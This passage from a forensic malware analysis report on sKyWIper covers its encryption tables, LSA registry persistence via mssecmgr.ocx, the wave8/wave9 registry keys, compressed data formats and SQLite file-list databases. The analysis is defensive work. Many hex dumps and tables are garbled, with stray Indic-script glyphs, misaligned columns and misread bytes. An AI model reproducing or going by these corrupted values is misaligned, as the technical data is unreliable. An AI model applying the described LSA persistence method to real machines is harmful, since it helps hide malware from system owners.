| 28  |      | 5C    |      | 90    | 51    | C4   |       | F8  |       |
| 29  |      | 5D    |      | 91    | 76    | C5   |       | E9  |       |
| 2A  |      | 5 E   |      | 92    |       | ୍ଦ ହ |       | FA  | 5 €   |
| 2B  | 6C   | 5 F   | 20   | ਰੇ ਤੇ | BA    | C7   |       | FB  | 61    |
| 2C  | бе   | 60    |      | ਰੇ ਪੈ |       | C8   |       | FC  |       |
| 2D  |      | e I   |      | 95    | 46    | ਫ਼ਰ  |       | FD  |       |
| 2E  | ব ব  | 62    |      | વે ર  |       | CA   |       | FE  | 5C    |
| 2F  |      | ર 3   | 52   | 97    | 70    | СВ   | 53    | FF  |       |
| 30  | 6E   | ୧ ବ   |      | ರಿ 8  |       | CC   |       |     |       |
| 31  |      | 65    | 35   | ਰੇ ਰੇ |       | CD   |       |     |       |
| 32  | 73   | 66    | ਤੇ ਦ | 9 A   |       | CE   | ರ 8   |     |       |
| 33  |      | 67    |      | 9B    | 4 a   | CF   | 77    |     |       |
|     |      |       |      |       |       |      |       |     |       |

Figure 22 –Encryption E6B – TO691 2nd stage substitution table – known elements (left: cipher character, right: cleartext character)

![](_page_30_Picture_2.jpeg)

We also share some samples with the encryptions above to make it easier to pinpoint the encryption algorithm:

| 000000000: FF F5 FF FF FE FE 23   FC FF FF FE 6F FE FF E4   ´б´`` tt#ü`` totjä<br>000000010: CE 4C 3E 00 00 00 00 00   00 00 FD FB FF FF FF 46  ÏL>              |  |  |  |  |  |  |  |  | ýű¨¨F                                                                           |  |
|------------------------------------------------------------------------------------------------------------------------------------------------------------------|--|--|--|--|--|--|--|--|---------------------------------------------------------------------------------|--|
|                                                                                                                                                                  |  |  |  |  |  |  |  |  | Figure 23 - Sample for encryption/encoding boot32drv.sys - simple XOR with 0xFF |  |
| 000000000: 75 EA EA EA FA 15 66 EA   EE 15 66 EA EA EA EO EA   ueeeu&feißfeeere<br>0000000010: EA F7 EF EC 24 EA EA   OD OD OD 0D 91 EA EA EA   e-dü\$eee♪♪♪'eee |  |  |  |  |  |  |  |  |                                                                                 |  |

Figure 24 - Sample for encryption/encoding made with encryption E1; 0xEA → 0x00

## 4.2. Registry parts

The malware does not modify too many registry keys as most information, data, configuration are stored in files. The affected registry entries are the following:

• For installations and startup, LSA is abused:

HKEY LOCAL MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Autenthication Packages will contain in new line mssecmgr.ocx:

[HKEY LOCAL MACHINE\SYSTEM\CurrentControlSet\Control\Lsa] "Authentication Packages"=hex(7):6d,00,73,00,76,00,31,00,5f,00,30,00,00,00,6d,\ 00,73,00,73,00,65,00,63,00,6d,00,67,00,72,00,2e,00,6f,00,63,00,78,00,00,00,\ 00,00

• For some communications between processes wave8 and wave9 are used. Wave8 possibly stores some PID, but this is just a guess. Wave9 is a name for the stored version of the "main module":

| 23:34:34,1794024                      | rundl132.exe 2388                       |                | ReqQueryValueHKLM\SOFTWARE\Microsoft\Windows  |
|---------------------------------------|-----------------------------------------|----------------|-----------------------------------------------|
| NT\CurrentVersion\Drivers32\wave9     |                                         | NAME NOT FOUND | Length: 536                                   |
| 23:35:05,5405919                      | wmiprvse.exe 2472                       |                | ReqQueryValueHKLM\SOFTWARE\Microsoft\Windows  |
| NT\CurrentVersion\Drivers32\wave9     |                                         | NAME NOT FOUND | Length: 536                                   |
| 23:35:39,6297465                      | rundl132.exe 2388                       |                | ReqQueryValueHKLM\SOFTWARE\Microsoft\Windows  |
| NT\CurrentVersion\Drivers32\wave9     |                                         | NAME NOT FOUND | Length: 144                                   |
| 23:35:39,6299138    rundl132.exe 2388 |                                         |                | ReqQueryValueHKLM\SOFTWARE\Microsoft\Windows  |
| NT\CurrentVersion\Drivers32\wave9     |                                         | NAME NOT FOUND | Length: 144                                   |
|                                       | 23:35:39,6300097      rundl132.exe 2388 |                | RegSetValue   HKLM\SOFTWARE\Microsoft\Windows |
| NT\CurrentVersion\Drivers32\wave9     |                                         | SUCCESS        | Type: REG SZ, Length: 2, Data:                |
| 23:35:39,6302820                      |                                         |                | ReqQueryValueHKLM\SOFTWARE\Microsoft\Windows  |
|                                       | rundl132.exe 2388                       |                |                                               |

![](_page_31_Picture_10.jpeg)

| 23:35:39,6313420    rundll32.exe 2388                    |                   | RegQueryValueHKLM\SOFTWARE\Microsoft\Windows                                  |  |  |  |  |  |
|----------------------------------------------------------|-------------------|-------------------------------------------------------------------------------|--|--|--|--|--|
| NT\CurrentVersion\Drivers32\wave9                        |                   | SUCCESS<br>Type: REG SZ, Lenqth: 2, Data:                                     |  |  |  |  |  |
| 23:35:39,6314414                                         | rundll32.exe 2388 | RegQueryValueHKLM\SOFTWARE\Microsoft\Windows                                  |  |  |  |  |  |
| NT\CurrentVersion\Drivers32\wave9                        |                   | SUCCESS<br>Type: REG SZ, Lenqth: 2, Data:                                     |  |  |  |  |  |
| 23:35:39,6314604     rundl132.exe 2388                   |                   | ReqQueryValueHKLM\SOFTWARE\Microsoft\Windows                                  |  |  |  |  |  |
| NT\CurrentVersion\Drivers32\wave9                        |                   | SUCCESS<br>Type: REG SZ, Length: 2, Data:                                     |  |  |  |  |  |
| 23:35:39,6315540                                         | rundl132.exe 2388 | ReqQueryValueHKLM\SOFTWARE\Microsoft\Windows                                  |  |  |  |  |  |
| NT\CurrentVersion\Drivers32\wave9                        |                   | Type: REG SZ, Lenqth: 2, Data:<br>SUCCESS                                     |  |  |  |  |  |
| 23:35:39,6315727                                         | rundll32.exe 2388 | RegQueryValueHKLM\SOFTWARE\Microsoft\Windows                                  |  |  |  |  |  |
| NT\CurrentVersion\Drivers32\wave9                        |                   | SUCCESS<br>Type: REG SZ, Length: 2, Data:                                     |  |  |  |  |  |
| 23:35:39,6332115    rundl132.exe 2388                    |                   | ReqSetValue   HKLM\SOFTWARE\Microsoft\Windows                                 |  |  |  |  |  |
| NT\CurrentVersion\Drivers32\wave9                        |                   | SUCCESS<br>Type: REG SZ, Length: 102,                                         |  |  |  |  |  |
| Data: c:\progra~1\common~1\micros~1\msaudio\wavesup3.drv |                   |                                                                               |  |  |  |  |  |
| 23:35:50,6732679                                         | alg.exe           | 2848   ReqQueryValueHKLM\SOFTWARE\Microsoft\Windows                           |  |  |  |  |  |
| NT\CurrentVersion\Drivers32\wave9                        |                   | SUCCESS<br>Type: REG SZ, Length: 102,                                         |  |  |  |  |  |
|                                                          |                   | Data: c:\progra~1\common~1\micros~1\msaudio\wavesup3.drv                      |  |  |  |  |  |
| 23:35:50,6733205                                         | alg.exe           | 2848   RegQueryValueHKLM\SOFTWARE\Microsoft\Windows                           |  |  |  |  |  |
| NT\CurrentVersion\Drivers32\wave9                        |                   | SUCCESS<br>Type: REG SZ, Length: 102,                                         |  |  |  |  |  |
| Data: c:\progra~1\common~1\micros~1\msaudio\wavesup3.drv |                   |                                                                               |  |  |  |  |  |
|                                                          |                   | 23:36:17,4627767 services.exe 748 RequeryValueHKIM\SOFTWARE\Microsoft\Windows |  |  |  |  |  |
| NT\CurrentVersion\Drivers32\wave9                        |                   | SUCCESS<br>Type: REG SZ, Length: 102,                                         |  |  |  |  |  |
|                                                          |                   | Data: c:\progra~1\common~1\micros~1\msaudio\wavesup3.drv                      |  |  |  |  |  |

![](_page_32_Figure_1.jpeg)

```
23:34:29,5181519 
                  wmiprvse.exe 2248
                                        RegQueryValueHKLM\SOFTWARE\Microsoft\Windows
NT\CurrentVersion\Drivers32\wave8
                                        NAME NOT FOUND
                                                            Length: 536
23:34:34,1793845    rundll32.exe 2388
                                        RegQueryValueHKLM\SOFTWARE\Microsoft\Windows
NT\CurrentVersion\Drivers32\wave8
                                        NAME NOT FOUND
                                                            Length: 536
23:35:05,5405737    wmiprvse.exe 2472
                                        RegQueryValueHKLM\SOFTWARE\Microsoft\Windows
NT\CurrentVersion\Drivers32\wave8
                                        NAME NOT FOUND
                                                            Lenath: 536
23:35:39,6273171    rundll32.exe 2388
                                        RegQueryValueHKLM\SOFTWARE\Microsoft\Windows
NT\CurrentVersion\Drivers32\wave8
                                        NAME NOT FOUND
                                                            Length: 144
23:35:39,6277806    rundll32.exe 2388
                                        RegQueryValueHKLM\SOFTWARE\Microsoft\Windows
NT\CurrentVersion\Drivers32\wave8
                                        NAME NOT FOUND
                                                            Length: 144
23:35:39,6278907      rundl132.exe 2388
                                        RegSetValue   HKLM\SOFTWARE\Microsoft\Windows
NT\CurrentVersion\Drivers32\wave8
                                        SUCCESS
                                                     Type: REG SZ, Length: 2, Data:
23:35:39,6292151
                   rundl132.exe 2388
                                        RegQueryValueHKLM\SOFTWARE\Microsoft\Windows
NT\CurrentVersion\Drivers32\wave8
                                        SUCCESS
                                                     Type: REG SZ, Length: 2, Data:
23:35:39,6293931
                   rundll32.exe 2388
                                        ReqQueryValueHKLM\SOFTWARE\Microsoft\Windows
NT\CurrentVersion\Drivers32\wave8
                                        SUCCESS
                                                     Type: REG SZ, Length: 2, Data:
23:35:39,6294881
                   rundll32.exe 2388
                                        ReqSetValue   HKLM\SOFTWARE\Microsoft\Windows
NT\CurrentVersion\Drivers32\wave8
                                        SUCCESS
                                                     Type: REG SZ, Length: 2, Data:
23:35:50,6732487
                   alg.exe
                                 2848
                                        RegQueryValueHKLM\SOFTWARE\Microsoft\Windows
NT\CurrentVersion\Drivers32\wave8
                                        SUCCESS
                                                     Type: REG SZ, Length: 2, Data:
23:36:17,4627582    services.exe 748
                                        RegQueryValueHKLM\SOFTWARE\Microsoft\Windows
NT\CurrentVersion\Drivers32\wave8
                                        SUCCESS
                                                     Type: REG SZ, Length: 2, Data:
                                        RegQueryValueHKLM\SOFTWARE\Microsoft\Windows
23:36:17,5738388     services.exe 748
NT\CurrentVersion\Drivers32\wave8
                                        SUCCESS
                                                     Type: REG_SZ, Length: 2, Data:
23:36:23,7643698     iexplore.exe 3240
                                        RegQueryValueHKLM\SOFTWARE\Microsoft\Windows
NT\CurrentVersion\Drivers32\wave8
                                                     Type: REG SZ, Length: 2, Data:
                                        SUCCESS
```
![](_page_32_Picture_3.jpeg)

| 23:36:43,0717217                      | iexplore.exe 3520 |           | ReqQueryValueHKLM\SOFTWARE\Microsoft\Windows |
|---------------------------------------|-------------------|-----------|----------------------------------------------|
| NT\CurrentVersion\Drivers32\wave8     |                   | SUCCESS S | Type: REG SZ, Length: 2, Data:               |
| 23:37:02,2292562    iexplore.exe 3632 |                   |           | ReqQueryValueHKLM\SOFTWARE\Microsoft\Windows |
| NT\CurrentVersion\Drivers32\wave8     |                   | SUCCESS   | Type: REG SZ, Length: 2, Data:               |

Figure 26 – Wave8 communications

## 4.3. Compression and table formats

The file ntcache.dat found among the DAT files contains logs from the inspected target computer. However, there are references for ntcache.dat as SFS Storage.

```
STORAGE.SFS.FILES.ntcache?dat.REINITIALIZE ME
STORAGE.SFS.FILES.ntcache?dat.DELETE ME
STORAGE.SFS.FILES.lmcache?dat.MAX SIZE
STORAGE.SFS.FILES.lmcache?dat.BACKUPsKyWIper
```
Figure 27 -Winlogon.exe with injected code working with ccalc32.sys - procmon

We present the beginning of the binary format for ntcache.dat below.

| 000000000000: | 02  | 30 30  |    | 30  | 30  | 30     | 30 | 31 | 45  | 5C  | 30 |     | 30 30 30 |      | 30 30 |       | @0000001E\000000 |      |   |    |     |                |   |     |  |
|---------------|-----|--------|----|-----|-----|--------|----|----|-----|-----|----|-----|----------|------|-------|-------|------------------|------|---|----|-----|----------------|---|-----|--|
| 0000000010 :  | 30  | 30     | 00 | 00  | 00  | 00     | 00 | 00 | 00  | 00  | 00 | 00  | 0 0      | 00   | 00    | 00    | 00               |      |   |    |     |                |   |     |  |
| 000000020:    | 00  | 00     | 00 | 0 0 | 00  | 00     | 00 | 00 | 00  | 00  | 00 | 00  | 00       | 00   | 00    | 00    |                  |      |   |    |     |                |   |     |  |
| 000000030 :   | 00  | 00     | 00 | 00  | 00  | 00     | 00 | 00 | 00  | 00  | 00 | 00  | 0 0      | 0 0  | 00    | 00    |                  |      |   |    |     |                |   |     |  |
| 0000000040:   | 0 0 | 00     | 00 | 00  | 00  | 00     | 00 | 00 | 00  | 00  | 00 | 00  | 00       | 0 0  | 0 0   | 00    |                  |      |   |    |     |                |   |     |  |
| 0000000050:   | 00  | 00     | 00 | 0 0 | 00  | 00     | 00 | 00 | 00  | 00  | 00 | 00  | 0 0      | 00   | 0 0   | 00    |                  |      |   |    |     |                |   |     |  |
| 0000000060 :  | 00  | 00     | 00 | 00  | 0 0 | 00     | 00 | 00 | 00  | 00  | 00 | 00  | 00       | 0 0  | 0 0   | 00    |                  |      |   |    |     |                |   |     |  |
| 0000000070 :  | 00  | 00     | 00 | 00  | 00  | 00     | 00 | 00 | 00  | 00  | 00 | 00  | 00       | 00   | 0 0   | 00    |                  |      |   |    |     |                |   |     |  |
| 0000000080:   | 0 0 | 00     | 00 | 0 0 | 00  | 00     | 00 | 00 | 00  | 00  | 00 | 00  | 00       | 0 0  | 00    | 00    |                  |      |   |    |     |                |   |     |  |
| 0000000090:   | 00  | 00     | 00 | 00  | 00  | 00     | 00 | 00 | 0 0 | 00  | 00 | 00  | 00       | 00   | 0 0   | 00    |                  |      |   |    |     |                |   |     |  |
| 00000000A0:   | 00  | 00     | 00 | 00  | 00  | 00     | 00 | 00 | 00  | 00  | 00 | 00  | 00       | 00   | 0 0   | 00    |                  |      |   |    |     |                |   |     |  |
| 00000000B0:   | 0 0 | 00     | 00 | 0 0 | 00  | 00     | 00 | 00 | 00  | 00  | 00 | 00  | 00       | 0 0  | 0 0   | 00    |                  |      |   |    |     |                |   |     |  |
| 000000000000: | 0 0 | 00     | 00 | 0 0 | 00  | 00     | 00 | 00 | 00  | 00  | 00 | 00  | 00       | 00   | 0 0   | 00    |                  |      |   |    |     |                |   |     |  |
| 00000000000:  | 00  | 00     | 00 | 00  | 00  | 00     | 00 | 00 | 00  | 00  | 00 | 00  | 00       | 00   | 00    | 00    |                  |      |   |    |     |                |   |     |  |
| 00000000E0:   | 00  | 00     | 00 | 00  | 00  | 00     | 00 | 00 | 00  | 00  | 00 | 00  | 00       | 00   | 00    | 00    |                  |      |   |    |     |                |   |     |  |
| 0000000F0 :   | 0 0 | 0 0    | 00 | 0 0 | 00  | 00     | 00 | 00 | 0 0 | 00  | 00 | 00  | 00       | 0 0  | 0 0   | 00    |                  |      |   |    |     |                |   |     |  |
| 0000000100:   | 0 0 | ರ<br>6 | 02 | 0 0 | 00  | F<br>6 | 57 | 1B | 5B  | 5 F | 88 | CC  | 01       | () ] | 00    | 00    |                  | ] ම  |   |    |     | ŠW←[ ^ } } =00 |   |     |  |
| 0000000110 :  | 00  | 28     | 01 | 0 A | 00  | 00     | 00 | FF | FF  | 00  | 00 | 43  | 0 0      | 4 D  | 00    | ਹੈ ਧੋ |                  | ( Oo |   |    |     | C M            |   | D   |  |
| 000000120:    | 0 0 | 02     | 00 | 0 0 | 00  | 33     | 00 | OC | 00  | 00  | 00 | FF  | FF       | 0 0  | 00    | ਧੇ ਪੈ | 0                |      | 3 | 40 |     |                |   | D   |  |
| 0000000130:   | 00  | 45     | 00 | 53  | 00  | 43     | 00 | OC | 0 0 | 00  | 00 | 42  | 00       | 47   | 00    | 66    | ಿ                | ്റ്  | C | 40 |     | B              | G | Ith |  |
| 0000000140 :  | 0 0 | 4 C    | 00 | 6 F | 0 0 | 77     | 00 | 2A | 00  | 00  | 00 | FF  | FF       | 0 0  | 00    | 52    | L                | O    | W | *  |     |                |   | R   |  |
| 0000000150:   | 0 0 | 45     | 00 | 51  | 00  | 55     | 00 | 45 | 00  | 53  | 00 | 54  | 00       | 45   | 00    | ਧੇ ਧੋ | ದ                | O    | U | P  | ്ട് | L              | ಗ | D   |  |
| 0000000160 :  | 00  | 5 F    | 00 | 4 6 | 00  | 4 9    | 00 | 4C | 00  | 45  | 00 | 5 F | 00       | 4 F  | 00    | 4 1   |                  | F    | I | L  | F   |                | N | A   |  |
|               |     |        |    |     |     |        |    |    |     |     |    |     |          |      |       |       |                  |      |   |    |     |                |   |     |  |

Figure 28 – Binary format of ntcache.dat (beginning)

We could not decide if the format is custom or just some strange binary format. A comparison with \*HLV473.tmp, a file that contains a list of running processes, reveals the sequences "78 DA ED" and "78 DA 73" standing for a zlib inflate compressed format.

![](_page_33_Picture_10.jpeg)

| 0000000EF0: 00 00 00 00 00 00 00 00 00 00 00 00 2B A0 80 B1                                                                             |  |  |  |  |  |  |  |  |  |  |  |  |  | +áC=                                                                                                                                                                          |
|-----------------------------------------------------------------------------------------------------------------------------------------|--|--|--|--|--|--|--|--|--|--|--|--|--|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
|                                                                                                                                         |  |  |  |  |  |  |  |  |  |  |  |  |  | 00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 |
|                                                                                                                                         |  |  |  |  |  |  |  |  |  |  |  |  |  |                                                                                                                                                                               |
| 000000F10: 90 94 A2 9B 15 56 37 D3   94 AA 9E 28 B2 2C 2B 0A  ÉöÓϧV7Ëö-× (二)<br>Figure 29 – "78 DA ED" compressed record in ntcache.dat |  |  |  |  |  |  |  |  |  |  |  |  |  |                                                                                                                                                                               |
|                                                                                                                                         |  |  |  |  |  |  |  |  |  |  |  |  |  |                                                                                                                                                                               |

|  |  |  |  |  |  |  |  |  | 000000000: 78 DA 73 EO 67 60 EO 65   60 60 60 01 E2 FF FF 19   xUsrqire ``Ca''  |
|--|--|--|--|--|--|--|--|--|---------------------------------------------------------------------------------|
|  |  |  |  |  |  |  |  |  | 0000000010: 18 18 81 34 63 02 1B 03   03 3F 10 E8 00 39 22 40 ↑↑?4c@-♥♥?►č 9"@  |
|  |  |  |  |  |  |  |  |  | 0000000020: CC 03 C4 1C 40 3C 81 E5   BE 64 68 DB 19 90 1A BO  È♥ÄL@<?Íľdhű¿?→° |
|  |  |  |  |  |  |  |  |  |                                                                                 |

Figure 30 – "78 DA 73" compressed record in ~HLV473.tmp

#### After decompression, we observe the following:

| 000000000: 40 OF 00 00 00 00 00 00 00 00 FF FF 00 00  @x =                                                                                                                     |  |  |  |  |  |  |  |  |  |  |         |  |
|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|--|--|--|--|--|--|--|--|--|--|---------|--|
| 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 |  |  |  |  |  |  |  |  |  |  |         |  |
| 000000020:00 14 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00                                                       |  |  |  |  |  |  |  |  |  |  | 0 2 + 3 |  |
| 0000000030: 19 55 86 CC 01 00 00 00   00 0F OF 0F 28 00 00   UHE®                                                                                                              |  |  |  |  |  |  |  |  |  |  |         |  |
| 000000040:00 18 02 00 00 10 02 00   00 00 02 02 00 00 FF FF 00    10 0 0000000000                                                                                              |  |  |  |  |  |  |  |  |  |  |         |  |
| 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 |  |  |  |  |  |  |  |  |  |  |         |  |
| 000000060: 00 20 00 20 00 20 00 20   00 20 00 20 00 20 00 20                                                                                                                   |  |  |  |  |  |  |  |  |  |  |         |  |
| 0000000070: 00 20 00 20 00 20 00 20   00 20 00 20 00 20                                                                                                                        |  |  |  |  |  |  |  |  |  |  |         |  |

Figure 31 – "78 DA 73" compressed record decompressed beginning from ~HLV473.tmp – information on running processes inside (Far.exe)

We also found PPMd compression format in ntcache.dat, probably marked by "8F AF AC 84". This is used by some libraries and programs including 7-zip, winzip, perl Compress:PPMd.

| 0000000450: 00 00 00 00 02 00 43 01   24 65 B3 A9 3A AF 59 00                     |  |  |  |  |  |  |  |  |  | ● COSe e : »Y |
|-----------------------------------------------------------------------------------|--|--|--|--|--|--|--|--|--|---------------|
| 000000460: 00 00 55 00 00 00 8F AF   AC 84 OF 01 9A 46 20 4F     U    Ć»Čääk@ÜF O |  |  |  |  |  |  |  |  |  |               |
| ' 000000470: ED 10 62 9C EO 42 02 D4   82 83 AF 02 6F CE DE 7D Ý►bťOB®ďéâ»®d╬Ü}   |  |  |  |  |  |  |  |  |  |               |

Figure 32 – "8F AF AC 84" PPMd compressed record in ntcache.dat

The same PPMd compression is used in the advnetcfg.ocx info-stealer (?) module:

| .text:1002E2F4   | lea  | [ebp+var 24]<br>eax,                 |
|------------------|------|--------------------------------------|
| .text : 1002E2F7 | push | eax                                  |
| .text : 1002E2F8 | push | বা                                   |
| .text:1002E2FA   | pop  | ebx                                  |
| .text:1002E2FB   | mov  | [ebp+var 10], 84ACAF8Fh ; PMMD magic |
| .text:1002E302   | call | sub 1000C28D                         |
| .text:1002E307   | mov  | byte ptr [ebp+var 4], 1              |
| .text:1002E30B   | mov  | ebx,<br>eax                          |
| .text : 1002E30D | call | sub 1000C439                         |
| .text:1002E312   | mov  | byte ptr [ebp+var 4], 0              |

Figure 33 – "8F AF AC 84" magic usage in advnetcfg.ocx

![](_page_34_Figure_12.jpeg)

Many DAT files have the following structure: A table is stored in a file, containing key-value pairs. The key-value pairs are separated by multiple OxFF characters (like padding), in some files with multiple 0xAE characters (Duqu often used 0xAE as well). Between the key and value OxFF, OxFE separates the data.

```
The ~DEB93D files contain Samba / nmb lookups in a proprietary table format
```

| 000000000: 26 C1 30 OE 51 36 XX 4F                                                                                                                                             |  |  |  |  | 03 00 00 22 00 00 00 |  |  |                         | 31      | CAOLOGION                               |
|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|--|--|--|--|----------------------|--|--|-------------------------|---------|-----------------------------------------|
| 0000000010: 00 39 00 32 00 2E 00 31   00 36 00 38 00 2E 00                                                                                                                     |  |  |  |  |                      |  |  |                         | 30      | 92 . 168 .<br>0                         |
| 000000020: 00 2E 00 31 00 31 00 20                                                                                                                                             |  |  |  |  | 00 57 00 50 00 41 00 |  |  |                         | ব বা বা | . 1 1<br>WPAD                           |
| 0000000030: 00 52 36 XX 4F 03 00 00                                                                                                                                            |  |  |  |  |                      |  |  | 22 00 00 00 31 00 39 00 |         | REXO♥<br>1 9                            |
| 0000000040: 32 00 2E 00 31 00 36 00 1                                                                                                                                          |  |  |  |  |                      |  |  | 38 00 2E 00 30 00 2E 00 |         | 2 . 1 6 8 .<br>()                       |
| 000000050: 31 00 31 00 20 00 57 00                                                                                                                                             |  |  |  |  |                      |  |  | 50 00 41 00 44 00 52 36 |         | 1 1<br>W P A D R6                       |
| 0000000060: XX 4F 03 00 00 2E 00 00 1                                                                                                                                          |  |  |  |  |                      |  |  |                         |         | 00 31 00 39 00 32 00 2E  XO♥<br>1 9 2 . |
| 0000000070: 00 31 00 36 00 38 00 2E   00 30 00 2E 00 31 00 31   1 6 8 .                                                                                                        |  |  |  |  |                      |  |  |                         |         | 0                                       |
| 0000000080: 00 20 00 47 00 4F 00 4F                                                                                                                                            |  |  |  |  |                      |  |  | 00 47 00 4C 00 45 00 2E |         | GOOGLE .                                |
| 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 |  |  |  |  |                      |  |  |                         |         | C O M S6XOY                             |

Figure 34 – "8F AF AC 84" PPMd compressed record in ntcache.dat

The table format is as follows: Ater 4 bytes header every record begins with UNIX timestamp (like 0x4FXX3651 in the figure), then "03 00 00″ is some kind of record header, "22″ refers to record length, but you should add 3, as the next "00 00 00" is not strictly related to the record, so the real payload without the "00 00 00" string is 0x22 bytes long.

Most of the records are readable queries like the ones above, but some contain raw samba protocol data.

The creation of ~DEB93D files are connected to nteps32 export functions, possibly EnableSHR, but this is not confirmed yet.

## 4.4. Data storage formats

Although the HLV and KWI file formats are not yet fully understood, these files contain data resembling to database table records and some records of the above described compressed formats.

From the extracted contents of some of these data files we found that they all (HLV, KWI, and even ntcache.dat) contain basic information on running processes. The information is about 1000-2000 bytes of redundant data. It contains the actual status of the running program, and in some cases, historical data as well. In some cases, they seem to contain screenshot related information besides the list of running processes.

![](_page_35_Picture_10.jpeg)

Further investigations on these files indicated that the KWI files have different purpose as shown in the figures below:

```
HighSeverityStorageFileName - KWI989.tmp
LowSeverityStorageFileName - KWI988.tmp
```
Figure 35 – KWI file names found in ccalc32drv.sys, labels hint the purpose of the KWI files

```
%CommonProgramFiles%\Microsoft Shared\MSAudio\
%CommonProgramFiles%\Microsoft Shared\MSSecurityMgr\
%CommonProgramFiles%Microsoft Shared\MSAPackages\
```
Figure 36 – Dat Storage – possible locations (this is the same as Nteps32 exports)

![](_page_36_Picture_5.jpeg)

## 4.5. Logging file list

The malware saves ~rf<number> files in /windows/temp. This operation seems to be automatic, but perhaps it may also be remotely controlled. These files are encrypted with the E1 encryption algorithm (see above). After decryption, the file appears to be an SQLite3 database, storing information on drivers, directories, and file names.

| Name     |                      | Object | Type                | Schema                                                                                                              |
|----------|----------------------|--------|---------------------|---------------------------------------------------------------------------------------------------------------------|
|          | - Media              | table  |                     | CREATE TABLE Media (ID INTEGER PRIMARY KEY, Type INT NOT NULL MediumDescription TEXT NOT NULL)                      |
|          | ID                   | field  | INTEGER PRIMARY KEY |                                                                                                                     |
|          | ··· Type             | field  | INT                 |                                                                                                                     |
|          | · Medium Description | field  | TEXT                |                                                                                                                     |
| E States |                      | table  |                     | CREATE TABLE States (Description TEXT NOT NULL, MediumId INT REFERENCES Media (ID), State BLOB)                     |
|          | "Description         | field  | TEXT                |                                                                                                                     |
|          | MediumId             | field  | INT                 |                                                                                                                     |
|          | State                | field  | BLOB                |                                                                                                                     |
|          | Dirlist_States       | table  |                     | CREATE TABLE Dirlist States (Description TEXT NOT NULL, MediumId INT REFERENCES Media (ID), State BLOB)             |
|          | ""Description        | field  | TEXT                |                                                                                                                     |
|          | : "MediumId          | field  | TNT                 |                                                                                                                     |
|          | State                | field  | BLOB                |                                                                                                                     |
|          | Files                | table  |                     | CREATE TABLE Files (MediunId INT REFERENCES Media (ID), FileName BLOB NOT NULL, LastModification DATE NOT NULL, P., |
|          | MediumId             | field  | INT                 |                                                                                                                     |
|          | "FileName            | field  | BLOB                |                                                                                                                     |
|          | Size                 | field  | INT                 |                                                                                                                     |
|          | LastModification     | field  | DATE                |                                                                                                                     |
|          | "Parsed              | field  | INT                 |                                                                                                                     |
|          | "LastSeen            | field  | DATE                |                                                                                                                     |
|          | -PST_States          | table  |                     | CREATE TABLE PST States (FleName BLOB NOT NUL, Size INT NOT NULL, LastModification DATE NOT NULL,                   |
|          | FileName             | field  | BLOB                |                                                                                                                     |
|          | Size                 | field  | INT                 |                                                                                                                     |
|          | "LastModification    | field  | DATE                |                                                                                                                     |
|          | """State             | field  | INT                 |                                                                                                                     |
|          | idx_States           | index  |                     | CREATE UNIQUE INDEX idx States ON States (Description, MediumId)                                                    |
|          | ids Dirlist States   | index  |                     | CREATE UNIQUE INDEX ids Dirlist States ON Dirlist States (Description, MediumId)                                    |
|          | idx_Files            | index  |                     | CREATE UNIQUE INDEX idx_Files ON Files (FileName, Size, LastModification, MediumId)                                 |
|          | "idx_Files_LastSeen  | index  |                     | CREATE INDEX idx_Files_LastSeen ON Files (LastSeen)                                                                 |
|          | ids Pst States       | index  |                     | CREATE UNIQUE INDEX ids Pst States ON PST states (FileName, Size, LastModification)                                 |

Figure 37 – SQLite database format for ~rf files [file db]

![](_page_37_Picture_4.jpeg)

|     | MediumId | FileName | Size   | LastModification Parsed |   | LastSeen   |
|-----|----------|----------|--------|-------------------------|---|------------|
| 173 |          | 1 C      | 13649  | 12777416022000          | 0 | 1318373621 |
| 174 |          | 1 C      | 616    | 12603830232000          | 0 | 1318373621 |
| 175 |          | 1 C      | 38554  | 12777416020000          | 0 | 1318373621 |
| 176 | 1        | C        | 204664 | 12956213612000          | 0 | 1318373621 |
| 177 |          | 1 C      | 23472  | 12814074110000          | 0 | 1318373621 |
| 178 |          | 1 C      | 3813   | 12777416024000          | 0 | 1318373621 |
| 179 |          | 1 C      | 5564   | 12603830204000          | 0 | 1318373621 |
| 180 |          | 1 C      | 16066  | 12943148481001          | 0 | 1318373621 |
| 181 |          | 1 C      | 0      | 12921070998582          | 0 | 1318373621 |
| 182 |          | 1 C      | 32803  | 12777416018000          | 0 | 1318373621 |
| 183 |          | 1 C      | 1441   | 12831095310000          | 0 | 1318373621 |
| 184 |          | 1 C      | 2689   | 12922325313001          | 0 | 1318373621 |
| 185 |          | 1 C      | 17982  | 12918599442001          | 0 | 1318373621 |
| 186 |          | 1 C      | 17992  | 12883433442001          | 0 | 1318373621 |
| 187 |          | 1 C      | 18002  | 12940490895001          | 0 | 1318373621 |
| 188 | 1        | C        | 18002  | 12945859860001          | 0 | 1318373621 |
| 189 |          | 1 C      | 35068  | 12935886435001          | 0 | 1318373621 |
| 190 |          | 1 C      | 35147  | 12938037804001          | 0 | 1318373621 |
| 191 |          | 1 C      | 35147  | 12941337666001          | 0 | 1318373621 |
| 192 |          | 1 C      | 35147  | 12943148475001          | 0 | 1318373621 |
| 193 |          | 1 C      | 35147  | 12948525762001          | 0 | 1318373621 |
| 194 |          | 1 C      | 35147  | 12959042366001          | 0 | 1318373621 |
| 195 |          | 1 C      | 35147  | 12961283059001          | 0 | 1318373621 |
| 196 |          | 1 C      | 27672  | 12959918144000          | 0 | 1318373621 |
| 197 |          | 1 C      | 43415  | 12958571724000          | 0 | 1318373621 |

Figure 38 –File list of the file system in the ~rf files

### Discussion:

Storing full directory listing in SQLite databases is something you won't expect from a malware. It's very strange as it raises complexity and the need for space, and in addition it leaks information through the database structure.

Note that the "SQLite browser" application cannot see full filenames as they are stored in Unicode format in blob entries, and the first \x00 stops viewing them.

## 4.6. Saving additional information

